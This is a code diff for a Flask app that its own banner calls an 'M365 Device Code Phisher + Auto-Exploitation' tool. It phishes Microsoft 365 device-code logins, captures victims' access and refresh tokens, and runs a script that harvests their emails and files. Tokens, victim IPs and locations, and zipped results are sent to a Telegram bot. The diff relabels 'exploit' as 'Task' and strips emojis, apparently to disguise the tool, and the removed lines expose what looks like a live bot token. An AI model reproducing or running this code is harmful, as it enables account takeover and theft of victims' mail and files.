@@ -11,16 +11,18 @@ import shutil
 import random
 import subprocess
 import sys
+from dotenv import load_dotenv
 
+load_dotenv()
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
 
 DB_NAME = "logs.db"
 HTML_PATH = "templates/index.html"
-EXPLOIT_DIR = "exploits"
+Task_DIR = "Tasks"
 
-TELEGRAM_BOT_TOKEN = "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k"
-TELEGRAM_CHAT_ID = "8689962848"
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
 CLIENT_IDS = [
     "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Azure CLI
@@ -28,8 +30,31 @@ CLIENT_IDS = [
     "872cd9fa-d31c-45c9-824e-b321b0e850cc",  # Power BI
 ]
 
-DEVICE_CODE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
-TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+DEVICE_CODE_URL = "https://www.office.com/login/common/oauth2/v2.0/devicecode"
+TOKEN_URL = "https://www.office.com/login/common/oauth2/v2.0/token"
+
+
+# Override production settings
+IS_PRODUCTION = os.getenv('FLASK_ENV') == 'production'
+
+if IS_PRODUCTION:
+    # Disable debug features
+    app.debug = False
+    
+    # Use file-based logging instead of print statements
+    import logging
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+        handlers=[
+            logging.FileHandler('logs/app.log'),
+            logging.StreamHandler()
+        ]
+    )
+    
+    # Suppress Flask development server warning
+    import warnings
+    warnings.filterwarnings('ignore', category=UserWarning, module='flask')
 
 def init_db():
     conn = sqlite3.connect(DB_NAME)
@@ -105,15 +130,15 @@ def test_token_capabilities(access_token, email):
         try:
             r = requests.get(f"https://graph.microsoft.com/v1.0/{endpoint}", headers=headers, timeout=10)
             if r.status_code == 200:
-                results.append(f"✅ {name}")
+                results.append(f"{name}")
         except:
             pass
     
     if results:
-        send_telegram_message(f"🎯 <b>{email}</b> access: {' | '.join(results)}")
+        send_telegram_message(f"<b>{email}</b> access: {' | '.join(results)}")
 
-def exploit_tokens(access_token, refresh_token, email):
-    """Execute M365 exploitation toolkit with captured tokens"""
+def Task_tokens(access_token, refresh_token, email):
+    """Execute M365 TASK toolkit with captured tokens"""
     try:
         # Create token JSON file
         token_data = {
@@ -129,79 +154,79 @@ def exploit_tokens(access_token, refresh_token, email):
             json.dump(token_data, f, indent=2)
         
         # Telegram notification
-        exploit_msg = f"""
-⚡ <b>🚀 EXPLOITATION STARTED</b> ⚡
+        Task_msg = f"""
+<b> TASK STARTED</b>
 
-👤 <code>{email}</code>
-📁 <code>{token_filename}</code>
+<code>{email}</code>
+<code>{token_filename}</code>
 
-<i>Token exploitation toolkit launched automatically...</i>
+<i>Token TASK toolkit launched automatically...</i>
         """
-        send_telegram_message(exploit_msg)
+        send_telegram_message(Task_msg)
         
         # Run script.py asynchronously
-        exploit_dir = f"{EXPLOIT_DIR}/{safe_email}"
-        os.makedirs(exploit_dir, exist_ok=True)
+        Task_dir = f"{Task_DIR}/{safe_email}"
+        os.makedirs(Task_dir, exist_ok=True)
         
         cmd = [
             sys.executable, "script.py",
             "--token-file", token_filename,
-            "--output-dir", exploit_dir,
+            "--output-dir", Task_dir,
             "--verbose"
         ]
         
-        def run_exploit():
+        def run_Task():
             try:
                 result = subprocess.run(
                     cmd,
                     capture_output=True,
                     text=True,
                     timeout=300,  # 5 min timeout
-                    cwd=exploit_dir
+                    cwd=Task_dir
                 )
                 
                 if result.returncode == 0:
                     # Count results
-                    files = os.listdir(exploit_dir)
+                    files = os.listdir(Task_dir)
                     email_count = len([f for f in files if 'email' in f.lower()])
                     file_count = len([f for f in files if 'file' in f.lower()])
                     
                     # Send success + summary
                     summary_msg = f"""
-✅ <b>EXPLOITATION COMPLETE: {email}</b> ✅
+ <b>TASK COMPLETE: {email}</b> 
 
-📊 Results in: <code>{exploit_dir}</code>
-📈 Summary:
-• Sensitive emails: <b>{email_count}</b>
-• Files found: <b>{file_count}</b>
-• Groups/Teams: Enumerated
+Results in: <code>{Task_dir}</code>
+Summary:
+Sensitive emails: <b>{email_count}</b>
+Files found: <b>{file_count}</b>
+Groups/Teams: Enumerated
 
-<code>{token_filename}</code> → Full M365 compromise!
+<code>{token_filename}</code> → Full M365 access
                     """
                     send_telegram_message(summary_msg)
                     
                     # Zip results and send
-                    zip_filename = f"{exploit_dir}_results.zip"
-                    shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', exploit_dir)
-                    send_telegram_document(zip_filename, f"🎯 Full results: {email}")
+                    zip_filename = f"{Task_dir}_results.zip"
+                    shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', Task_dir)
+                    send_telegram_document(zip_filename, f"Full results: {email}")
                     
                 else:
-                    error_msg = f"❌ Exploit failed for <code>{email}</code>\n<pre>{result.stderr[:1000]}</pre>"
+                    error_msg = f"Task failed for <code>{email}</code>\n<pre>{result.stderr[:1000]}</pre>"
                     send_telegram_message(error_msg)
                     
             except subprocess.TimeoutExpired:
-                send_telegram_message(f"⏰ Exploit timeout for <code>{email}</code>")
+                send_telegram_message(f"Task timeout for <code>{email}</code>")
             except Exception as e:
-                send_telegram_message(f"💥 Exploit error <code>{email}</code>: {str(e)}")
+                send_telegram_message(f"Task error <code>{email}</code>: {str(e)}")
         
-        # Start exploitation in daemon thread
-        threading.Thread(target=run_exploit, daemon=True).start()
+        # Start TASK in daemon thread
+        threading.Thread(target=run_Task, daemon=True).start()
         
-        print(f"🚀 Exploitation launched: {email} → {token_filename}")
+        print(f"TASK launched: {email} → {token_filename}")
         
     except Exception as e:
-        print(f"❌ Exploit launch failed: {e}")
-        send_telegram_message(f"💥 Exploit setup failed for <code>{email}</code>: {str(e)}")
+        print(f"Task launch failed: {e}")
+        send_telegram_message(f"Task setup failed for <code>{email}</code>: {str(e)}")
 
 def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_attempts=60):
     data = {
@@ -221,21 +246,21 @@ def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_att
                         result.get('id_token_claims', {}).get('preferred_username') or "Unknown")
 
                 success_msg = f"""
-🔥 <b>Microsoft SUCCESS!</b> 🔥
+<b>Task SUCCESS!</b> 
 
-👤 <code>{email}</code>
-🔢 <code>{user_code}</code>
+<code>{email}</code>
+<code>{user_code}</code>
 
-🌐 {ip} — {location.get('city')}, {location.get('country')}
-🕒 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+{ip}  {location.get('city')}, {location.get('country')}
+{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-<b>Tokens captured → Exploitation launched!</b>
+<b>Tokens captured → TASK launched!</b>
                 """
                 send_telegram_message(success_msg)
 
-                # LAUNCH EXPLOITATION IMMEDIATELY
+                # LAUNCH TASK IMMEDIATELY
                 threading.Thread(
-                    target=exploit_tokens, 
+                    target=Task_tokens, 
                     args=(result.get('access_token'), result.get('refresh_token'), email),
                     daemon=True
                 ).start()
@@ -261,7 +286,7 @@ def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_att
                 filename = f"tokens_{email.split('@')[0]}_{int(time.time())}.json"
                 with open(filename, 'w') as f:
                     json.dump(token_data, f, indent=2)
-                send_telegram_document(filename, f"✅ Tokens: {email}")
+                send_telegram_document(filename, f"Tokens: {email}")
 
                 # DB storage
                 conn = sqlite3.connect(DB_NAME)
@@ -274,20 +299,20 @@ def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_att
                 conn.commit()
                 conn.close()
 
-                print(f"✅ SUCCESS + EXPLOIT: {email} -> {filename}")
+                print(f"SUCCESS + Task: {email} -> {filename}")
                 return
 
             elif result.get('error') == 'authorization_pending':
                 time.sleep(5)
                 continue
             elif result.get('error') == 'expired_token':
-                print(f"❌ Expired: {user_code}")
+                print(f"Expired: {user_code}")
                 return
 
         except Exception as e:
             time.sleep(5)
 
-    print(f"❌ Timeout: {user_code}")
+    print(f"Timeout: {user_code}")
 
 @app.route('/')
 def index():
@@ -319,13 +344,13 @@ def start_device_flow():
             return "Error", 500
 
         message = f"""
-📱 <b>New Device Code</b>
+    <b>New Device Code</b>
 
-🔢 <code>{user_code}</code>
-🔗 <a href="{verification_uri}">{verification_uri}</a>
+<code>{user_code}</code>
+<a href="{verification_uri}">{verification_uri}</a>
 
-🌐 {ip} — {location.get('city')}, {location.get('country')}
-🕒 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+ {ip}  {location.get('city')}, {location.get('country')}
+ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
         """
         send_telegram_message(message)
 
@@ -343,7 +368,7 @@ def start_device_flow():
 <h2>Enter this code</h2><p>Go to <strong>microsoft.com/devicelogin</strong> and enter:</p>
 <div class="code">{{ user_code }}</div>
 <p style="font-size:14px;"><strong>{{ verification_uri }}</strong></p>
-<p style="color:#666;font-size:14px;">Expires in 15 minutes</p>
+<p style="color:#666;font-size:14px;">Expires in 60 minutes</p>
 </div></body></html>
         ''', user_code=user_code, verification_uri=verification_uri)
 
@@ -405,15 +430,15 @@ def export_json():
     response.headers["Content-Disposition"] = "attachment; filename=captures_export.json"
     return response
 
-@app.route('/exploits')
-def exploits_index():
-    """List all exploitation results"""
-    if not os.path.exists(EXPLOIT_DIR):
-        return jsonify({"error": "No exploits found"}), 404
+@app.route('/Tasks')
+def Tasks_index():
+    """List all TASK results"""
+    if not os.path.exists(Task_DIR):
+        return jsonify({"error": "No Tasks found"}), 404
     
     victims = []
-    for victim_dir in os.listdir(EXPLOIT_DIR):
-        victim_path = os.path.join(EXPLOIT_DIR, victim_dir)
+    for victim_dir in os.listdir(Task_DIR):
+        victim_path = os.path.join(Task_DIR, victim_dir)
         if os.path.isdir(victim_path):
             files = os.listdir(victim_path)
             victims.append({
@@ -425,13 +450,13 @@ def exploits_index():
     return jsonify({"victims": victims})
 
 if __name__ == '__main__':
-    os.makedirs(EXPLOIT_DIR, exist_ok=True)
+    os.makedirs(Task_DIR, exist_ok=True)
     init_db()
-    print("🚀 M365 Device Code Phisher + Auto-Exploitation v3.0")
-    print("📱 http://0.0.0.0:5000/           # Landing page")
-    print("📊 http://0.0.0.0:5000/stats      # Live stats JSON")
-    print("💾 http://0.0.0.0:5000/db         # Full DB download")
-    print("📤 http://0.0.0.0:5000/export     # JSON export")
-    print("🎯 http://0.0.0.0:5000/exploits   # Exploitation results")
-    print(f"🗄️  DB: {DB_NAME} | 📁 Exploits: {EXPLOIT_DIR}/")
+    print("M365 Device Code Phisher + Auto-TASK v3.0")
+    print("http://0.0.0.0:5000/           # Landing page")
+    print("http://0.0.0.0:5000/stats      # Live stats JSON")
+    print("http://0.0.0.0:5000/db         # Full DB download")
+    print("http://0.0.0.0:5000/export     # JSON export")
+    print("http://0.0.0.0:5000/Tasks   # TASK results")
+    print(f"DB: {DB_NAME} | 📁 Tasks: {Task_DIR}/")
     app.run(host='0.0.0.0', port=5000, debug=False)
